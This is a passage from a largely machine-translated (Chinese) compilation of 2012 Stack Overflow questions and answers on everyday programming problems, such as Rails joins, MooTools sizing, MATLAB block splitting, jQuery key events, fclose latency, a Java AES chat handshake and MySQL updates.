您可以使用[`.joins`](http://api.rubyonrails.org/classes/ActiveRecord/QueryMethods.html#method-i-joins)

```
Employee.joins(:tags) 
```

此生成的 SQL 包含和`INNER JOIN`在`tags`表上，省略`employees`了没有关联记录的表`tags`记录。

# mootools - 如何使用 CSS height auto MooTools 获取元素的 px 高度？

> ID：12078822
> 
> 赞同：0
> 
> 时间：2012-08-22T17:59:12.050
> 
> 标签：mootools

有没有办法获得实际的元素高度？getSize().y
返回 0，因为元素具有属性高度 auto？即使您将图像内联属性声明为自动，您也会得到 0 回来？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T23:14:26.183

听起来你有一个不同的问题，但为了使这个与未来相关，MooTools 中的机制是（对于具有 id 的元素`x`：

```
$('x').getSize().y 
```

或者

```
$('x').getCoordinates().height 
```

其中任何一个都将返回像素高度的整数（无单位）。因此，其中任何一个都会返回 100 像素高的元素`100`。

您还可以使用非 MooTools 特定的`getComputedStyle`方法：

```
$('x').getComputedStyle('height') 
```

它以单位返回元素高度。所以一个 100 像素高的元素会返回`100px`。

# image - 使用 MATLAB 将图像分成大小相等的块并使用 Gabor 滤波器

> ID：12078825
> 
> 赞同：1
> 
> 时间：2012-08-22T17:59:14.767
> 
> 标签：image, matlab, image-processing, block

如何使用 MATLAB 将 120x120 大小的面部图像划分为 64 个 15x15 像素大小的块？然后我想用 Gabor 滤波器对每个 15x15 块进行卷积。我无法使用 blkproc 功能。我该怎么做？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T18:40:18.367

要提取这些块，您可以使用以下内容，假设`img`是 120x120 图像矩阵，`c=15`, `w=8`：

```
blocks = reshape(permute(reshape(img, c, w, c, w), [1 3 2 4]), c, c, w * w) 
```

现在`blocks`是一个 15x15x64 的矩阵，`blocks(:, :, i)`是一个 15x15 的矩阵，代表第`i`-th 块。

# windows-phone-7 - 我可以从 WP7 的 ContextMenu 中删除一个 MenuItem

> ID：12078827
> 
> 赞同：0
> 
> 时间：2012-08-22T17:59:29.540
> 
> 标签：windows-phone-7, data-binding, listbox, contextmenu, windows-phone-7.1

我正在寻找一种方法——如果可能的话——从 Windows Phone 7 的 ContextMenu 中删除 MenuItem 控件。

这是我的 XAML 的简化版本：

```
<ListBox>
<ListBox.ItemTemplate>
    <DataTemplate>
        <StackPanel>
            [ -- Content -- ]
            <toolkit:ContextMenuService.ContextMenu>
                <toolkit:ContextMenu>
                    <toolkit:MenuItem Header="view attributes" Tag="ATTRIBUTES" Click="ViewSelectedResultAttributes" />
                    <toolkit:MenuItem Header="view groups" Tag="GROUPS" Click="ViewSelectedResultGroups" />
                    <toolkit:MenuItem Header="view webpage" Tag="ONLINE" Click="ViewWebPage" />
                </toolkit:ContextMenu>
            </toolkit:ContextMenuService.ContextMenu>
        </StackPanel>
    </DataTemplate>
</ListBox.ItemTemplate>
</ListBox> 
```

现在，并非绑定集合中的所有项目都有与之关联的网站，对于那些项目，我希望删除带有*ONLINE*标记的 MenuItem （*即*最后一个 MenuItem）。

但我找不到实现这一目标的方法。

我还考虑过以编程方式添加 ContextMenu 和所有 MenuItem，以便有条件地添加每个 MenuItem，但我似乎找不到诸如 OnItemDataBound 或 OnDataBinding*等*事件。

谁能帮我吗？

更新：更具体地说，我不想从ListBox 中*每个*绑定项目的 ContextMenu 中删除 MenuItem，我只想在绑定对象不符合条件时删除 ListBox中*特定项目上的 MenuItem。*

假设我的 ListBox 包含 3 个绑定项：ListItem_1、ListItem_2、ListItem_3

现在，假设绑定到 ListItem_2 的对象的属性之一为 NULL；在这种情况下，ListItem_2 应从其 ContextMenu 中删除其中一个 MenuItem 控件，而 ListItem_1 和 ListItem_3 仍应具有此 MenuItem。

理想的是一个事件，它允许我在绑定每个项目时捕获它，并且它还公开 ContextMenu。ListBox.Items 集合只是返回我指定为数据源的相同对象集合，而 ListBoxItems 的集合会更有用 - 这是否存在？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:56:24.873

首先，为您的上下文菜单命名，以便能够从代码隐藏中轻松检索它：

```
<toolkit:ContextMenu x:Name="ContextMenu"> 
```

从那里，您可以使用`this.ContextMenu.Items`. 因此，只需删除您不再需要的那些：

```
var item = this.ContextMenu.Items.OfType<MenuItem>().First(m => (string)m.Tag == "ONLINE");

this.ContextMenu.Items.Remove(item); 
```

# ruby - Want to install Jruby but intimidated by RVM

> ID：12078828
> 
> 赞同：1
> 
> 时间：2012-08-22T17:59:33.457
> 
> 标签：ruby, rvm

Want to install Jruby and I am pretty sure that I want to manage it with RVM. My problem is that I am a little intimidated by RVM with its command line and all the dependencies (bash, git, etc.) I am on Windows 7, ruby 1.9.3. Can someone please help a newbie out and explain this in English.
Thanks

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-22T18:18:21.840

Windows 不支持 RVM。

```
"If you would like to manage multiple versions of ruby on windows please use pik which is an excellent tool by Gordon Thiesfeld. You can find it on GitHub." 
```

在 Windows 上管理 ruby​​ 版本的选项：

1.  pik 是一个在 Windows 上管理多个 ruby​​ 版本的工具。它可以从 Windows 命令行 (cmd.exe)、Windows PowerShell 或 Git Bash 中使用。[Github-pik](https://github.com/vertiginous/pik)

2.  您也可以使用[Cygwin](http://cygwin.com)，然后安装所需的各种软件包。查看

    [如何使用cygwin在windows上安装rvm](http://www.tiplite.com/how-to-install-rvm-on-windows-using-cygwin/)

我建议在使用开源软件时使用 linux/mac OS。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:28:19.807

如果你想在 Windows 上安装 ruby​​，我建议你使用[PIK](http://rubyinstaller.org/add-ons/pik/)。它由 RubyInstaller 赞助。

而且，关于在 Windows 上安装 Jruby ……您所要做的就是访问 JRuby 网站并下载**.exe 文件**。

JRuby 网站链接在这里：http: [//jruby.org/download](http://jruby.org/download)

# jquery - Adding a keydown event to a jQuery modal popup window with dynamic content

> ID：12078831
> 
> 赞同：1
> 
> 时间：2012-08-22T17:59:39.710
> 
> 标签：jquery, asp.net

I have created functions to create a Yes/No confirm window that popups with jQuery that I use in a .net project to confirm responses from the user. I have generated buttons that trigger functions depending on what you click on.

//load a specailized popup for confirming things in a localized manner function popupConfirm(TitleKey, InstructionsKey, YesFunction, NoFunction) {

```
//create the service to give us the content
var agpc = new AjaxServices.AjaxPopUps();

//get the results and open the popup with the functions aligned
agpc.GetLocalizedStrings(new Array(TitleKey, InstructionsKey, "Yes", "No"), function (results) {
    var content = jQuery.parseJSON(results.toString());

    //get the buttons for confirm/or not
    var YesNoButtons = jQuery('<div></div>', { id: 'YesNoButtons' });
    var yesButton = jQuery('<a>' + content.Yes + '</a>');
    var noButton = jQuery('<a>' + content.No + '</a>');

    //add the event handlers
    yesButton.click(YesFunction);
    noButton.click(NoFunction);

    //set a nice pointer for mouse over
    yesButton.css({ cursor: 'pointer' });
    noButton.css({ cursor: 'pointer' });

    YesNoButtons.append(yesButton).append(noButton);
    //show the box
    openPopup("Non-JSON", YesNoButtons, eval('content.' + TitleKey), eval('content.' + InstructionsKey));

    });
} 
```

Well now comes the difficult part. The company also wants keypresses to trigger the yes/no functions. An enter key should trigger yes and escape should trigger no. I have no real idea how I will do this with this type of setup.

You can ignore most of the code in there. It is to get localized strings from the server. It the adding the keydown() event that I can't figure out.

Any ideas?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:06:32.927

好吧，这不是很难做到，只需尝试自定义调整并使用以下跨浏览器支持的代码。

如果您需要捕捉事件键（键盘上按下的键）并执行一些操作：

```
$("#YourDialog").keypress( function(event) {  // when you do a key press inside of the element with ID YourDialog 
    var keyCode = event.keyCode ? event.keyCode : event.which;
    if( event.keyCode == 13 || event.keyCode == 27 ) { // catching event for clicking either enter key or escape key.
     $("#OkButton").trigger('click');
     // or $("#YourDialog").hide(); to hide your dialog.
    }
}); 
```

相反，如果您需要阻止默认键操作，则必须使用此代码：

```
$("#YourDialog").keypress( function(event) {  // when you do a key press inside of the element with ID YourDialog 
    var keyCode = event.keyCode ? event.keyCode : event.which;
    if( event.keyCode == 13 || event.keyCode == 27 ) { // catching event for clicking either enter key or escape key.
     event.preventDefault();  // preventing the default action - so, in this case, when the enter or escape is pressed nothing will happen. Especially it's important when you want to prevent user from click some keys. 
     event.stopPropagation();
    }
}); 
```

您必须捕获用户事件（按下的键）。键码 13 是指回车键，键码 27 是指退出键。keyCode 变量普遍适用于所有浏览器，包括 Internet Explorer。

另请参阅此处以获取完整的[keyCode 列表](http://www.cambiaresearch.com/articles/15/javascript-char-codes-key-codes)。

我希望这对你有用。

# iphone - Trying to get local notification to work in iphone app

> ID：12078833
> 
> 赞同：0
> 
> 时间：2012-08-22T17:59:55.067
> 
> 标签：iphone, notifications

I am trying to create a local notification on my iphone app. I want it to be launched once per day at 9am.

But nothing is happening, either in the simulator or on the ipod.

Here is the full code from xcode in my appdelegate.m file.
This app was created in dreamweaver using phonegap...is that an issue? do i even have the code in the right place?

```
 //
//  assignmentAppDelegate.m
//  assignment
//
//  Created by Noel Chenier on 23 December, 2011.
//  Copyright  2011\. All rights reserved.
//

#import "assignmentAppDelegate.h"
#import "PhoneGapViewController.h"

@implementation assignmentAppDelegate

- (id) init
{   
    /** If you need to do any extra app-specific initialization, you can do it here
     *  -jm
     **/
    return [super init];
}

/**
 * This is main kick off after the app inits, the views and Settings are setup here.
 */
- (void)applicationDidFinishLaunching:(UIApplication *)application
{   
    [ super applicationDidFinishLaunching:application ];
}

-(id) getCommandInstance:(NSString*)className
{
    /** You can catch your own commands here, if you wanted to extend the gap: protocol, or add your
     *  own app specific protocol to it. -jm
     **/
    return [super getCommandInstance:className];
}

/**
 Called when the webview finishes loading.  This stops the activity view and closes the imageview
 */
- (void)webViewDidFinishLoad:(UIWebView *)theWebView 
{
    return [ super webViewDidFinishLoad:theWebView ];
}

- (void)webViewDidStartLoad:(UIWebView *)theWebView 
{
    return [ super webViewDidStartLoad:theWebView ];
}

/**
 * Fail Loading With Error
 * Error - If the webpage failed to load display an error with the reson.
 */
- (void)webView:(UIWebView *)theWebView didFailLoadWithError:(NSError *)error 
{
    return [ super webView:theWebView didFailLoadWithError:error ];
}

/**
 * Start Loading Request
 * This is where most of the magic happens... We take the request(s) and process the response.
 * From here we can re direct links and other protocalls to different internal methods.
 */
- (BOOL)webView:(UIWebView *)theWebView shouldStartLoadWithRequest:(NSURLRequest *)request navigationType:(UIWebViewNavigationType)navigationType
{
    return [ super webView:theWebView shouldStartLoadWithRequest:request navigationType:navigationType ];
}

- (BOOL) execute:(InvokedUrlCommand*)command
{
    return [ super execute:command];
}

- (void)scheduleNotification{

    NSCalendar *calendar = [NSCalendar autoupdatingCurrentCalendar];
    NSDate *today = [NSDate date];
    NSDateComponents *dateComponents = [calendar components:(NSYearCalendarUnit |    NSMonthCalendarUnit   |NSMinuteCalendarUnit ) fromDate:today];
    NSDateComponents *dateComps = [[NSDateComponents alloc] init];
    [dateComps setDay:dateComponents.day];
    [dateComps setMonth:dateComponents.month];
    [dateComps setYear:dateComponents.year];
    [dateComps setHour:9];
    [dateComps setMinute:00];
    NSDate *fireDate = [calendar dateFromComponents:dateComps];

    UILocalNotification *localNotif = [[UILocalNotification alloc] init];
    if (localNotif == nil)
        return;
    localNotif.fireDate = fireDate;
    localNotif.timeZone = [NSTimeZone defaultTimeZone];
    localNotif.repeatInterval = NSMinuteCalendarUnit;

    localNotif.alertBody = @"Don't forget your 365 Day Photo Challenge Assignment";
    localNotif.alertAction = @"LAUNCH";

    localNotif.soundName = UILocalNotificationDefaultSoundName;
    localNotif.applicationIconBadgeNumber = 1;

    [[UIApplication sharedApplication] scheduleLocalNotification:localNotif];
    [localNotif release];
}

- (void)dealloc
{
    [ super dealloc ];
}

@end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T19:40:41.043

我已经解决了。我把代码放在后面：

```
/**
 * This is main kick off after the app inits, the views and Settings are setup here.
 */
- (void)applicationDidFinishLaunching:(UIApplication *)application
{ 
```

# clojure - Recommend Web framework for Clojure

> ID：12078840
> 
> 赞同：16
> 
> 时间：2012-08-22T18:00:27.853
> 
> 标签：clojure

My next big hobby hack coming up is to make a website for myself with Clojure. I figure this would be a good way to learn Clojure but trying to plan ahead I think a came across some outdated information.

Right now [Noir](http://webnoir.org/) looks like a winner. I'm open to any suggestions on what I should try using.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-22T18:12:42.167

Compojure 是常见的首选。

它有很好的记录，例子比比皆是。因为 Compojure 已经存在了一段时间（在 Clojure 术语中），所以有一些过时的教程。您可以发现这些，因为在示例中它们将具有类似 clojure 1.2 的内容。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-22T19:20:20.033

我用过Noir好几次。如果您在 Clojure 中构建网站，强烈推荐。不过过了一段时间，我们最终使用 Ember.js 将大部分业务逻辑转移到了客户端。然后 Noir Clojure 变成了一个 RESTful json 服务。Clojure 的数量减少了（我很沮丧，嘘），但应用程序在这种方式下要好得多。Ember 非常适合构建许多依赖和连接的视图，这些视图在检索或保存新数据时需要同步在一起。

但我离题了。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-08-22T19:54:26.873

这取决于您希望通过 Web 框架解决的具体任务。我认为这个主题 -[成熟的 Clojure Web 框架？](https://stackoverflow.com/questions/3551805/mature-clojure-web-frameworks)会帮助你。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-08-23T01:44:10.730

我一直关注的另一个是[joodo](http://www.joodoweb.com/)。

# javascript - JavaScript：控制台中打印的最后一个值

> ID：12078843
> 
> 赞同：10
> 
> 时间：2012-08-22T18:00:47.320
> 
> 标签：javascript, google-chrome, console

是否有与`_`JavaScript 中的 Python 等价的引用控制台中打印的最后一个值？

我对 Chrome 尤其感兴趣。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2012-08-23T14:33:30.593

在 Chrome 和 Firefox 中，您可以使用`$_`. 它引用上次评估的返回值。

[![在此处输入图像描述](../Images/a731e7b6be7410fc7a4221639179d1a5.png)](https://i.stack.imgur.com/sYNIn.png)

# c++ - fclose() function slow

> ID：12078846
> 
> 赞同：4
> 
> 时间：2012-08-22T18:00:52.617
> 
> 标签：c++

I tried to create around 4 GB file using c++ fopen, fwrite and fflush and fclose functions on Linux machine, but I observed that fclose() function is taking very long time to close the file, taking around (40-50 seconds). I checked different forum to find the reason for this slowness, changed the code as suggested in forums, Used setvbuf() function to make unbuffered I/O as like write() function. but still could not resolve the issue.

```
 totalBytes = 4294967296 // 4GB file
        buffersize = 2000;    
        while ( size <= totalBytes )
        {
            len = fwrite(buffer, 1, bufferSize, fp);
            if ( len != bufferSize ) {
                cout<<"ERROR (Internal): in calling ACE_OS::fwrite() "<<endl;
                ret = -1;
            }
            size = size + len;
        }
        ...
        ...
        ...
        fflush(fp);
        flcose(fp); 
```

Any solution to the above problem would be very helpful.

thanks, Ramesh

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T18:19:57.783

操作系统正在推迟对磁盘的实际写入，并且可能不会在任何写入操作或什至在`fflush()`.

我查看了手册页`fflush()`并看到以下注释：

> 请注意， fflush() 仅刷新 C 库提供的用户空间缓冲区。为确保数据物理存储在磁盘上，内核缓冲区也必须刷新，例如使用 sync(2) 或 fsync(2)。

（也有类似的注释`fclose()`，尽管您的 Linux 系统上的行为似乎不同）

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-22T18:04:00.087

将这么多数据写入磁盘需要很长时间，而且没有办法绕过这个事实。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-22T18:21:15.760

是的， fclose() 所花费的时间是操作系统将数据写入磁盘所花费的时间的一部分。
查看[fsync](http://linux.die.net/man/2/fsync)以实现您可能想要的 fflush。如果您想显示一些进度并且 fclose() 使用的时间使其不准确，您可以每写入 100 MB 执行一次 fsync() 或类似的操作。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-22T18:12:38.563

fopen/fwrite/fclose 是围绕低级打开/写入/关闭的 C 标准包装器。所有 fflush 正在做的是确保所有的“写”调用都是为缓冲的东西进行的。fflush 没有“同步点”。操作系统在允许“关闭”返回之前刷新写缓冲区。

# javascript - Javascript函数变量传递语法问题

> ID：12078847
> 
> 赞同：0
> 
> 时间：2012-08-22T18:00:55.907
> 
> 标签：javascript, html, function

我正在尝试将变量传递给 Javascript 函数并遇到我不理解的问题。

这可以。

```
<select name="AppointmentTimeDropDownList" id="username" onchange="checkUserName(this.value, document.forms['CustomerInteractionForm'].elements['AppointmentDateTextBox'].value)"> 
```

但这给了我一个语法错误，我的 IDE 说它丢失了；声明之前。

```
<select name="AppointmentTimeDropDownList" id="username" onchange="checkUserName(this.value, document.forms['CustomerInteractionForm'].elements['AppointmentDateTextBox'].value), document.forms['CustomerInteractionForm'].elements['AppointmentAssignedToDropDownList'].value)"> 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T18:03:17.587

看来您在`)`这里有错误：

```
... .elements['AppointmentDateTextBox'].value), d ... 
```

# ruby-on-rails-3 - Gem Conflict Running Tests Inside Sublime Text 2 -- RVM issue?

> ID：12078850
> 
> 赞同：0
> 
> 时间：2012-08-22T18:01:18.857
> 
> 标签：ruby-on-rails-3, unit-testing, rvm, sublimetext2

Not quite sure what's changed in my setup, running tests inside Sublime Text 2 was working until recently ... Now, when I run an Rspec test from within Sublime Text 2 I get the following error.

This looks to me like an RVM issue, since I created a gemset a while ago. Any ideas?

Here's the error:

```
/Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@global/gems/bundler-1.1.3/lib/bundler/runtime.rb:31:in `block in setup': You have already activated spork 0.9.2, but your Gemfile requires spork 0.9.0\. Using bundle exec may solve this. (Gem::LoadError)
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@global/gems/bundler-1.1.3/lib/bundler/runtime.rb:17:in `setup'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@global/gems/bundler-1.1.3/lib/bundler.rb:107:in `setup'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@global/gems/bundler-1.1.3/lib/bundler/setup.rb:17:in `<top (required)>'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:60:in `require'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:60:in `rescue in require'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:35:in `require'
    from /Users/brettsanders/rails_projects/sample_app/config/boot.rb:6:in `<top (required)>'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /Users/brettsanders/rails_projects/sample_app/config/application.rb:1:in `<top (required)>'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /Users/brettsanders/rails_projects/sample_app/config/environment.rb:2:in `<top (required)>'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /Users/brettsanders/rails_projects/sample_app/spec/spec_helper.rb:8:in `block in <top (required)>'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@rails3tutorial2ndEd/gems/spork-0.9.2/lib/spork.rb:24:in `prefork'
    from /Users/brettsanders/rails_projects/sample_app/spec/spec_helper.rb:6:in `<top (required)>'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /Users/brettsanders/.rvm/rubies/ruby-1.9.3-p0/lib/ruby/site_ruby/1.9.1/rubygems/custom_require.rb:36:in `require'
    from /Users/brettsanders/rails_projects/sample_app/spec/requests/static_pages_spec.rb:1:in `<top (required)>'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@rails3tutorial2ndEd/gems/rspec-core-2.10.1/lib/rspec/core/configuration.rb:746:in `load'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@rails3tutorial2ndEd/gems/rspec-core-2.10.1/lib/rspec/core/configuration.rb:746:in `block in load_spec_files'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@rails3tutorial2ndEd/gems/rspec-core-2.10.1/lib/rspec/core/configuration.rb:746:in `map'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@rails3tutorial2ndEd/gems/rspec-core-2.10.1/lib/rspec/core/configuration.rb:746:in `load_spec_files'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@rails3tutorial2ndEd/gems/rspec-core-2.10.1/lib/rspec/core/command_line.rb:22:in `run'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@rails3tutorial2ndEd/gems/rspec-core-2.10.1/lib/rspec/core/runner.rb:69:in `run'
    from /Users/brettsanders/.rvm/gems/ruby-1.9.3-p0@rails3tutorial2ndEd/gems/rspec-core-2.10.1/lib/rspec/core/runner.rb:10:in `block in autorun'
[Finished in 0.8s with exit code 1] 
```

Also, Here's my Gemfile

```
source 'https://rubygems.org'

gem 'rails', '3.2.8'

# Bundle edge Rails instead:
# gem 'rails', :git => 'git://github.com/rails/rails.git'

group :development, :test do
  gem 'sqlite3', '1.3.5'
  gem 'rspec-rails', '2.10.0'
  gem 'guard-rspec', '0.5.5'
end

# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails',   '3.2.4'
  gem 'coffee-rails', '3.2.2'
  gem 'uglifier',     '1.2.3'
end

gem 'jquery-rails', '2.0.2'

group :test do
  gem 'capybara', '1.1.2'
  gem 'rb-fsevent', '0.4.3.1', :require => false
  gem 'growl', '1.0.3'
  gem 'guard-spork', '0.3.2'
  gem 'spork', '0.9.0'
end

group :production do
  gem 'pg', '0.12.2'
end

# To use ActiveModel has_secure_password
# gem 'bcrypt-ruby', '~> 3.0.0'

# To use Jbuilder templates for JSON
# gem 'jbuilder'

# Use unicorn as the app server
# gem 'unicorn'

# Deploy with Capistrano
# gem 'capistrano'

# To use debugger
# gem 'debugger' 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-23T18:19:23.097

看起来你已经安装了 0.9.2 版本并且 sublime text 正在尝试使用它

将 GemFile 中的 spork 版本更新为 0.9.2 或执行

gem卸载spork

您将看到要删除哪个版本的选项，请选择带有 0.9.2 的版本

# java - Java 加密聊天客户端未通过关联

> ID：12078851
> 
> 赞同：0
> 
> 时间：2012-08-22T18:01:22.163
> 
> 标签：java, sockets

所以我制作了这个非常依赖安全和加密的基本聊天应用程序。在使所有内容协同工作时，我遇到了一些问题。

我已经设法在客户端和服务器之间建立了连接，但我也希望他们共享一个公共密码，他们将使用该密码来解密整个聊天会话，因此只有这两个会查看它。此外，密码永远不会通过网络传输以增加安全性。这就是我的问题开始的地方。

一旦我的客户端和服务器连接，服务器就会发送一个用户指定的质询，该质询基本上是一个字符串，客户端需要解密并发送回该字符串，然后服务器会查看它是否匹配，如果匹配，通信将继续，很像 WiFi 中的 WPA 加密。

我的加密设置是 AES，我有一个字符串和一个密钥，然后将整个内容加密并解码为 Base64，然后发送。解密时，该过程显然是相反的。服务器设法正常发送所有内容，但客户端在解密时返回 null，即使它正确接收到加密字符串。我基本上有一个类充当客户端或服务器，具体取决于用户的选择。

下面是一些代码/堆栈跟踪：服务器输出：KCcOYuXTUD6SaXJQ4qIn7Q== helloworld

客户端输出：KCcOYuXTUD6SaXJQ4qIn7Q== null

加密/解密方法： http: [//pastebin.com/TtErYyz6](http://pastebin.com/TtErYyz6)

套接字写入/读取方法： http: [//pastebin.com/73QcQxva](http://pastebin.com/73QcQxva)

客户端的堆栈跟踪：http://pastebin.com/NdexZdyV[注意](http://pastebin.com/NdexZdyV) ：当逐行调试时，它只是像 27 一样停止在套接字 pastebin 链接中

希望我已经包含了足够的细节来获得解决方案：P 感谢您的帮助，我一直在为这个项目努力工作，即使某些功能是不必要的，我仍然会尝试在适用的情况下实现它们以尽可能多地学习当我下个月开始我的编程学位时

完整代码： http: [//pastebin.com/xkunfX37](http://pastebin.com/xkunfX37)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:54:11.490

我在主机验证码（verifyHost 函数）中发现了一些问题。

首先，字符串比较很棘手：

```
if(tempChallenge == decryptedChallenge){ 
```

您正在将字符串与 == 进行比较，这仅在它们是相同的字符串对象时才有效。使用 String.equals 函数进行正确的字符串比较：

```
if( decryptedChallenge.equals(tempChallenge) ){ 
```

其次，输入流也很棘手。您正在从输入流中读取所有内容，然后尝试读取更多内容。服务器在质询中向客户端发送一条线路，并期望收到一条回复。而客户端读取 3 行。

第三，服务器代码中的 CPU 吃循环。它将占用大量 CPU，并且调用`in.readline()`将阻塞并等待输入。

```
while(!in.ready()){} // you can drop this line. 
```

这是带有修改后代码的 pastebin：http: [//pastebin.com/JxazrA0G](http://pastebin.com/JxazrA0G)

# php - MySQL：更新第一个可用列为空的行

> ID：12078853
> 
> 赞同：0
> 
> 时间：2012-08-22T18:01:33.220
> 
> 标签：php, mysql, sql, database

我有一个表格，用于跟踪用户与其网站的其他各个方面之间的一些关联。

我需要能够获取第一个可用行并更新其中的一个或两个列......标准是该`user_id`列是否已被使用。

```
id | tag_id | user_id | product_id 
```

如果一行有一个没有`user_id`分配的可用标签，我希望能够使用和更新该行以获取最新购买的产品。

```
1 | 100001 | 29 | 66  
2 | 100002 | 0  | 0 
3 | 100003 | 0  | 0 
```

如您所见，第二行将是第一个符合条件的候选人。

我只是不确定为了实现这一点需要什么 SQL

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:13:47.527

如果我理解正确，您想更新第一个可用的空（不是 NULL，而是空）user_id 行。这个怎么样？

```
UPDATE users 
SET user_id = 'user_value_here' 
WHERE user_id='' 
LIMIT 1 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-22T18:46:56.163

```
UPDATE yourTablename SET user_id = 'your value for userid',
product_id='ur value for productid' WHERE id=(select min(id) where user_id='0'); 
```

已经告诉过的替代方法是有效的，但是如果您的表使用 id 进行排序

```
UPDATE yourTablename SET user_id = 'your value for userid',
product_id='ur value for productid' where user_id='0' LIMIT 1; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:19:46.050

如果您的索引是 sorted `ASC`，下面的查询应该按顺序找到第一个结果。

见[小提琴](http://sqlfiddle.com/#!2/606e6/1)。

```
UPDATE table SET user_id = 1 WHERE user_id IS NULL LIMIT 1 
```

您可以替换`IS NULL`为空的条件`user_id`。

# statistics - Filemaker pro：如何制作特定表格字段的报表？

> ID：12078858
> 
> 赞同：0
> 
> 时间：2012-08-22T18:02:03.347
> 
> 标签：statistics, report, filemaker

我是教育部的一名实习生，我们在那里修理学校的计算机，为此我使用 filemaker pro 创建了一个表格，其中包含以下字段：学校名称、问题、日期、修复者……等等。我想生成一个特定领域的报告，例如：一份报告将显示这所特定学校有多少次将其设备带入维修。或者这个特定员工修理设备的次数。并打印报告。

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-23T11:33:15.820

一个好的开始是选择创建新布局的命令（视图 - 布局模式，然后布局 - 新布局/报告），选择报告类型并按下一步。这将提供一个向导，询问有关报告的一些问题，甚至创建一个脚本来运行报告。

# sql - 用 IN 和 Like 选择

> ID：12078868
> 
> 赞同：0
> 
> 时间：2012-08-22T18:02:48.700
> 
> 标签：sql, sql-server-2008, tsql

我有一个非常有趣的问题。我有一个带有多项选择下拉菜单的 SSRS 报告。下拉菜单允许选择多个值或所有值。所有的价值观都不是问题。

问题是 1 或多个选项的组合

当我在下拉菜单中选择“AAA”时，它应该返回 3 个值：“AAA”、“AAA 1”、“AAA 2”

现在只返回 1 个值。

**问题：**

如何使 IN 语句像 LIKE 一样工作？

```
The Drop down select

SELECT '(All)' AS team, '(All)' AS Descr 
UNION ALL
SELECT 'AAA' , 'AAA' 
UNION ALL
SELECT 'BBB' , 'BBB'  

Table Mytable

ColumnA Varchar(5)

Values for ColumnA
'AAA'
'AAA 1'
'AAA 2'
'BBB'
'BBB 1'
'BBB 2'

SELECT * FROM Mytable
WHERE ColumnA IN (SELECT * FROM SplitListString(@Team, ',')))

Split function

CREATE FUNCTION [dbo].[SplitListString]
 (@InputString NVARCHAR(max), @SplitChar CHAR(1))
 RETURNS @ValuesList TABLE
 (
 param NVARCHAR(MAX)
 )
 AS
 BEGIN

    DECLARE @ListValue     NVARCHAR(max)
    DECLARE @TmpString     NVARCHAR(max) 
    DECLARE @PosSeparator  INT  
    DECLARE @EndValues     BIT

    SET @TmpString = LTRIM(RTRIM(@InputString));
    SET @EndValues = 0

    WHILE (@EndValues = 0) BEGIN
        SET @PosSeparator = CHARINDEX(@SplitChar, @TmpString)

        IF (@PosSeparator) > 1 BEGIN
            SELECT @ListValue = LTRIM(RTRIM(SUBSTRING(@TmpString, 1, @PosSeparator -1 )))
        END
        ELSE BEGIN
            SELECT @ListValue = LTRIM(RTRIM(@TmpString))
            SET @EndValues = 1
        END

        IF LEN(@ListValue) > 0 BEGIN
